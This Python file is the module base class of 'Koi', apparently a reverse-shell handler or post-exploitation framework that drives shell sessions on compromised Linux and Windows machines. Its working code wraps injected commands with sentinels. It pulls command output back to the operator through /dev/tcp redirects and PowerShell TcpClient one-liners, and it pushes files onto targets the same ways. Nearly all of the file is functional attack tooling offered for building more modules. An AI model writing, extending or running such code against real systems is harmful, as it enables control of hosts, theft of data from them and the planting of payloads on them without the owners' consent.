from __future__ import annotations

import re
import select
import socket
import threading
import time
import uuid
from abc import ABC, abstractmethod
from typing import TYPE_CHECKING, Callable, List, Literal, Optional, Union

if TYPE_CHECKING:
    from koi.session import Session

from koi.utils.config import TIMEOUTS
from koi.utils.models import CommandResult, StreamLine
from koi.utils import ui
from koi.utils.tcp import get_local_ip, spawn_recv_server, spawn_send_server

import argparse

_PS_PROMPT = re.compile(r'^PS\s+\S+>\s*')
_ANSI_RE   = re.compile(r'\x1b\[[0-9;?]*[a-zA-Z]|\r')
_SELECT_TIMEOUT = 0.1

PlatformSpec = Union[
    Literal["linux", "windows_cmd", "windows_ps", "any"],
    List[Literal["linux", "windows_cmd", "windows_ps"]],
]

class TCPReceiveServer:
    """One-shot TCP server that collects bytes from the first incoming connection."""

    def __init__(self, timeout: float = TIMEOUTS["download"], on_progress=None):
        self._timeout     = timeout
        self._on_progress = on_progress
        self._sock        = None
        self._done        = threading.Event()
        self._data        = b""
        self._error       = None
        self.port: int    = 0

    def start(self) -> "TCPReceiveServer":
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(("0.0.0.0", 0))
        self._sock.listen(1)
        self._sock.settimeout(self._timeout)
        self.port = self._sock.getsockname()[1]
        threading.Thread(target=self._run, daemon=True).start()
        return self

    def _run(self) -> None:
        try:
            conn, _ = self._sock.accept()
            buf = b""
            while chunk := conn.recv(65536):
                buf += chunk
                if self._on_progress:
                    self._on_progress(len(buf))
            conn.close()
            self._data = buf
        except Exception as exc:
            self._error = str(exc)
        finally:
            self._close()
            self._done.set()

    def collect(self) -> bytes:
        """Block until all data is received. Raises RuntimeError or TimeoutError."""
        self._done.wait(timeout=self._timeout + 2)
        if self._error:
            raise RuntimeError(self._error)
        if not self._done.is_set():
            raise TimeoutError("TCP receive server timed out")
        return self._data

    def stop(self) -> None:
        self._close()

    def _close(self) -> None:
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None

    def __enter__(self) -> "TCPReceiveServer":
        return self.start()

    def __exit__(self, *_) -> None:
        self.stop()


class CommandTimeout(Exception):
    def __init__(self, command: str, timeout: float):
        self.command = command
        self.timeout = timeout
        super().__init__(f"Command timed out after {timeout}s: {command}")


class KoiModule(ABC):
    """
    Base class for all Koi modules.

    Quickstart
    ----------
    Create a file in src/koi/modules/ and subclass KoiModule:

        from koi.modules.blueprint import KoiModule

        class MyModule(KoiModule):
            name        = "my_module"
            description = "Does something cool."

            def run(self) -> None:
                result = self.exec("whoami")
                self.ok(f"Running as: {result.stdout.strip()}")
    """

    #: Short identifier used to call the module from the CLI (e.g. "enum_linux")
    name: str = "unnamed_module"

    #: One-line summary shown in the module list
    description: str = "No description provided."

    #: Optional longer help text shown with `module help <name>`
    usage: str = ""

    #: Optional list of argument specifications
    arguments: list[dict] = []

    #: Optional category for grouping modules in the UI
    category: Optional[str] = None

    #: Supported platform(s): "linux", "windows_cmd", "windows_ps", "any",
    #: or a list combining multiple specific targets.
    platform: PlatformSpec = "any"

    @staticmethod
    def _clean(text: str) -> str:
        return _ANSI_RE.sub("", text).strip()

    @classmethod
    def supports(cls, os_type: Optional[str]) -> bool:
        """Return True if this module is compatible with the given session OS type."""
        if cls.platform == "any":
            return True
        if os_type is None:
            return False
        if isinstance(cls.platform, list):
            return os_type in cls.platform
        return cls.platform == os_type

    def __init__(
        self,
        session: "Session",
        args: Optional[List[str]] = None,
        logger=None,
    ) -> None:
        """
        Parameters
        ----------
        session:
            The active :class:`~koi.main.Session` this module will operate on.
        args:
            Positional arguments passed after the module name on the CLI.
            e.g. ``module run enum_linux -t 30``   args == ["-t", "30"]
        """
        self.session = session
        self.raw_args = args or []
        self.args = self._parse_args()
        self._logger = logger

        # Convenience shortcuts so module authors don't need extra imports
        self.ui = ui
        self.notify = ui.notify
        self.spinner = ui.Spinner
        self.breaker = ui.breaker_with_text
        self.box = ui.print_report_box
        self.table = ui.print_table

    def _parse_args(self):
        if not self.arguments:
            return argparse.Namespace()

        parser = argparse.ArgumentParser(prog=self.name, add_help=False)
        for arg in self.arguments:
            arg = arg.copy()
            flags = arg.pop("flags")
            if isinstance(flags, list) and not flags[0].startswith("-"):
                parser.add_argument(flags[0], **arg)
            else:
                parser.add_argument(*flags, **arg)

        try:
            return parser.parse_args(self.raw_args)
        except SystemExit:
            return argparse.Namespace()

    def _get_local_ip(self) -> str:
        """Return the local IP that routes toward the current session."""
        return get_local_ip(self.session.addr[0])

    def _win_query(self, ps_expr: str, timeout: float = TIMEOUTS["exec_query"]) -> str:
        """
        Evaluate a PowerShell expression on the remote Windows target and return
        its string output.

        For plain (non-upgraded) sessions the result is read back inline via a
        sentinel marker.  For upgraded ConPtyShell sessions the output is a raw
        VT100 stream, so we redirect the result over a fresh side-channel TCP
        socket instead (same technique as _exec_clean for Linux).
        """
        if self.session.upgraded:
            return self._win_query_sidechannel(ps_expr, timeout)

        sentinel = uuid.uuid4().hex
        marker = f"__KOI_{sentinel}__"

        if self.session.os_type == "windows_ps":
            cmd = f"({ps_expr}); '{marker}'"
        else:
            inner = f"({ps_expr}); '{marker}'"
            cmd = f'powershell -NoProfile -NonInteractive -c "{inner}"'

        eol = self.session.eol
        enc = self.session.encoding
        self.session.conn.sendall((cmd + eol).encode(enc))

        buf = b""
        deadline = time.monotonic() + timeout
        lines: list[str] = []

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            r, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
            if not r:
                continue
            chunk = self.session.conn.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                raw, buf = buf.split(b"\n", 1)
                text = raw.decode(enc, errors="replace").strip("\r\n ")
                text = _PS_PROMPT.sub("", text).strip()
                if not text or "Write-Host" in text:
                    continue
                if marker in text:
                    result = lines[-1] if lines else ""
                    if self._logger and result:
                        self._logger.log_event(f"exec  {ps_expr}")
                        self._logger.log_output(result.encode("utf-8", errors="replace"))
                    return result
                lines.append(text)

        # timeout path
        result = lines[-1] if lines else ""
        if self._logger and result:
            self._logger.log_event(f"exec  {ps_expr}")
            self._logger.log_output(result.encode("utf-8", errors="replace"))
        return result

    def _win_query_sidechannel(self, ps_expr: str, timeout: float = TIMEOUTS["exec_query"]) -> str:
        """
        Variant of _win_query for upgraded (ConPtyShell) sessions.
        Opens a local TCP socket and asks PowerShell to push its result there,
        bypassing the VT100 stream entirely.
        """
        local_ip = self._get_local_ip()
        port, collect = spawn_recv_server(timeout=timeout)

        ps_cmd = (
            f"$_r=({ps_expr})|Out-String;"
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
            f"$_s=$_c.GetStream();"
            f"$_b=[Text.Encoding]::UTF8.GetBytes($_r.Trim());"
            f"$_s.Write($_b,0,$_b.Length);"
            f"$_s.Flush();$_c.Close()"
        )
        self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
        result = collect().decode("utf-8", errors="replace").strip()
        if self._logger and result:
            self._logger.log_event(f"exec  {ps_expr}")
            self._logger.log_output(result.encode("utf-8", errors="replace"))
        return result

    def _exec_clean(self, cmd: str, timeout: float = TIMEOUTS["exec_query"]) -> str:
        """Run a Linux command and collect its stdout via a side TCP channel."""
        local_ip = self._get_local_ip()
        port, collect = spawn_recv_server(timeout=timeout)
        self.exec(f"( {cmd} ) > /dev/tcp/{local_ip}/{port}", timeout=timeout, _silent=True)
        result = collect().decode("utf-8", errors="replace").strip()
        if self._logger:
            self._logger.log_event(f"exec  {cmd}")
            if result:
                self._logger.log_output(result.encode("utf-8", errors="replace"))
        return result

    def _try_exec(self, cmd: str, timeout: float = TIMEOUTS["exec_query"]) -> str:
        """Run a Linux command via the side channel; return empty string on any error."""
        try:
            return self._exec_clean(cmd, timeout=timeout)
        except Exception:
            return ""

    def _dispatch_ps(self, ps_cmd: str) -> None:
        """Route a PS command to the session: raw socket for upgraded, sendline otherwise."""
        if self.session.upgraded:
            self.session.send((ps_cmd + "\r\n").encode(self.session.encoding))
            time.sleep(0.3)
            r, _, _ = select.select([self.session.conn], [], [], 1.0)
            if r:
                self.session.conn.recv(4096)
        elif self.session.os_type == "windows_ps":
            self.sendline(ps_cmd)
        else:
            escaped = ps_cmd.replace('"', '\\"')
            self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')

    def _upload_bytes_lin(
        self,
        raw: bytes,
        dest: str,
        timeout: float = TIMEOUTS["upload"],
        on_progress: Optional[Callable[[int], None]] = None,
    ) -> bool:
        """Transfer *raw* bytes to *dest* on a Linux target via /dev/tcp."""
        local_ip = self._get_local_ip()
        port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
        result = self.exec(f"cat < /dev/tcp/{local_ip}/{port} > {dest}", timeout=timeout)
        thread.join(timeout=timeout)

        if errors or not result.success:
            return False

        size_str = self._try_exec(f"wc -c < {dest} 2>/dev/null")
        try:
            return int(size_str.split()[0]) == len(raw)
        except (ValueError, IndexError):
            return False

    def _upload_bytes_win(
        self,
        raw: bytes,
        dest: str,
        timeout: float = TIMEOUTS["upload"],
        on_progress: Optional[Callable[[int], None]] = None,
    ) -> bool:
        """Transfer *raw* bytes to *dest* on a Windows target via a PS TCP client."""
        local_ip = self._get_local_ip()
        port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
        ps_cmd = (
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
            f"$_s=$_c.GetStream();"
            f"$_f=[IO.File]::OpenWrite($ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('{dest}'));"
            f"$_b=New-Object byte[] 65536;"
            f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
            f"$_f.Close();$_c.Close()"
        )
        self._dispatch_ps(ps_cmd)
        thread.join(timeout=timeout)
        return not errors

    def _upload_bytes(
        self,
        raw: bytes,
        dest: str,
        timeout: float = TIMEOUTS["upload"],
        on_progress: Optional[Callable[[int], None]] = None,
    ) -> bool:
        """Transfer *raw* bytes to *dest*, dispatching to the right platform."""
        if self.session.os_type == "linux":
            return self._upload_bytes_lin(raw, dest, timeout, on_progress)
        return self._upload_bytes_win(raw, dest, timeout, on_progress)

    def run_module(self) -> None:
        if self._logger:
            self._logger.log_event(f"module_start  {self.name}")
        try:
            self.run()
        finally:
            if self._logger:
                self._logger.log_event(f"module_end  {self.name}")

    @abstractmethod
    def run(self) -> None:
        """
        Entry point for the module.  All business logic goes here.

        Available helpers
        -----------------
        self.exec(cmd)        -> CommandResult  (blocking, raises on timeout)
        self.exec_stream(cmd) -> Iterator[StreamLine]
        self.send(data)       -> bool  (raw bytes to the socket)
        self.notify(type, msg)
        self.spinner(msg)     -> context manager
        self.box(title, dict)
        self.breaker()
        self.session          -> Session dataclass (id, conn, addr, upgraded, ...)
        self.args             -> list[str] from the CLI
        """
    def exec(self, command: str, timeout: float = TIMEOUTS["exec_command"], _silent: bool = False):
        sentinel = uuid.uuid4().hex
        marker = f"__KOI_DONE_{sentinel}__"
        wrapped = (
            f'( {command} ); _rc=$?; '
            f'printf "\\n{marker}:$_rc\\n"\n'
        )
        self.session.conn.sendall(wrapped.encode("utf-8"))

        buf = b""
        deadline = time.monotonic() + timeout
        output_lines = []

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise CommandTimeout(command, timeout)

            ready, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
            if not ready:
                continue

            chunk = self.session.conn.recv(4096)
            if not chunk:
                break

            buf += chunk
            while b"\n" in buf:
                raw_line, buf = buf.split(b"\n", 1)
                text = raw_line.decode("utf-8", errors="replace").rstrip("\r")
                if text.startswith(marker):
                    rc = int(text.split(":")[-1]) if ":" in text else 0
                    output = "\n".join(output_lines)
                    result = CommandResult(
                        command=command,
                        returncode=rc,
                        stdout=output,
                        duration=time.monotonic() - (deadline - timeout),
                    )
                    if self._logger and not _silent:
                        self._logger.log_event(f"exec  {command}")
                        if output:
                            self._logger.log_output(output.encode("utf-8", errors="replace"))
                    return result
                output_lines.append(text)

        result = CommandResult(
            command=command, returncode=1,
            stdout="\n".join(output_lines),
            duration=0,
        )
        if self._logger and not _silent:
            self._logger.log_event(f"exec  {command}")
            if result.stdout:
                self._logger.log_output(result.stdout.encode("utf-8", errors="replace"))
        return result

    def exec_stream(self, command: str, timeout: float = TIMEOUTS["exec_command"]):
        """
        Stream output of *command* line-by-line from the remote session as
        :class:`~koi.shell_handler.result.StreamLine` objects.

        Example::

            for line in self.exec_stream("find / -name '*.conf' 2>/dev/null"):
                self.notify('info', line.text)
        """
        sentinel = uuid.uuid4().hex
        marker   = f"__KOI_DONE_{sentinel}__"
        wrapped  = f'( {command} ); printf "\\n{marker}\\n"\n'
        self.session.conn.sendall(wrapped.encode("utf-8"))

        buf      = b""
        deadline = time.monotonic() + timeout

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise CommandTimeout(command, timeout)

            ready, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
            if not ready:
                continue

            chunk = self.session.conn.recv(4096)
            if not chunk:
                return

            buf += chunk
            while b"\n" in buf:
                raw_line, buf = buf.split(b"\n", 1)
                text = raw_line.decode("utf-8", errors="replace").rstrip("\r")
                if marker in text:
                    return
                yield StreamLine(text=text)

    def send(self, data: bytes) -> bool:
        """
        Write raw *bytes* directly to the session socket.
        Returns ``False`` if the session is no longer alive.

        Useful for sending keystrokes or raw payloads.
        """
        return self.session.send(data)

    def sendline(self, line: str, encoding: str = "utf-8") -> bool:
        """Convenience wrapper: encode *line* + newline and send it."""
        return self.send((line + "\n").encode(encoding))

    def ok(self, msg: str) -> None:
        """Print a success-style info notification."""
        self.notify("info", msg)

    def err(self, msg: str) -> None:
        """Print an error notification."""
        self.notify("error", msg)

    def warn(self, msg: str) -> None:
        """Print a warning notification."""
        self.notify("warning", msg)

    def status(self, msg: str) -> None:
        """Print a status notification."""
        self.notify("status", msg)
        
    def success(self, msg: str) -> None:
        """Print a success notification."""
        self.notify("success", msg)

    def __str__(self) -> str:
        return f"<KoiModule {self.name!r} on session #{self.session.id}>"

    def __repr__(self) -> str:
        return self.__str__()